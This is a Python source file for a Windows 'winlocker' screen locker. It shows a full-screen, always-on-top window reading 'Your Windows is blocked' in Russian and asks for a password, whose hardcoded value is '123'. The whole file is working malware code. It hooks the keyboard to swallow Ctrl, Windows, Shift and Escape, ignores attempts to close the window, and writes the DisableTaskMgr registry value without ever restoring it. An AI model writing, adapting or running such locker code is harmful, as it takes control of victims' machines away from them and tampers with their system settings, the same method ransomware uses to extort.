-import ctypes
import time
import winreg as reg
from tkinter import *
import threading

# Constants for keyboard hook
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101

# Virtual key codes to block
blocked_keys = {0x11, 0x5B, 0x5C, 0x10, 0x1B}

# Define the KBDLLHOOKSTRUCT structure
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_uint),
        ("scanCode", ctypes.c_uint),
        ("flags", ctypes.c_uint),
        ("time", ctypes.c_uint),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

# Define the hook procedure
LowLevelKeyboardProc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(KBDLLHOOKSTRUCT))
hook_id = None

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode == 0:
        kbd = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        if wParam == WM_KEYDOWN or wParam == WM_KEYUP:
            if kbd.vkCode in blocked_keys:
                return 1  # Block the key
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

low_level_keyboard_proc_ptr = LowLevelKeyboardProc(low_level_keyboard_proc)

def set_hook():
    global hook_id
    hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, low_level_keyboard_proc_ptr, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
    if not hook_id:
        raise ctypes.WinError(ctypes.get_last_error())

def remove_hook():
    if hook_id:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_id)

def quit():
    pass

def CheckPassword(event=None):
    if password.get() == "123":
        root.destroy()
        remove_hook()

def disable_task_manager():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        try:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        except Exception as e:
            print(f"Failed to create registry key: {e}")
            return

    try:
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
        print("Task Manager access has been disabled.")
    except Exception as e:
        print(f"Failed to set registry value: {e}")
    finally:
        reg.CloseKey(key)

def keep_alive():
    msg = ctypes.wintypes.MSG()
    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

if __name__ == "__main__":
    root = Tk()
    X = root.winfo_screenwidth()
    Y = root.winfo_screenheight()
    bg = "black"
    font = "Arial 25 bold"
    root["bg"] = bg

    root.protocol("WM_DELETE_WINDOW", quit)
    root.attributes("-topmost", 1)
    root.geometry(f"{X}x{Y}")
    root.overrideredirect(1)

    Label(text="Ваш Windows заблокирован", fg="red", bg=bg, font=font).pack()
    Label(text="\n\n\n\nвведите пароль", fg="white", bg=bg, font=font).pack()

    password = Entry(font=font)
    password.pack()
    password.bind("<Return>", CheckPassword)

    disable_task_manager()

    # Setting up the keyboard hook
    set_hook()

    # Start the message loop in a separate thread
    threading.Thread(target=keep_alive, daemon=True).start()

    root.mainloop()
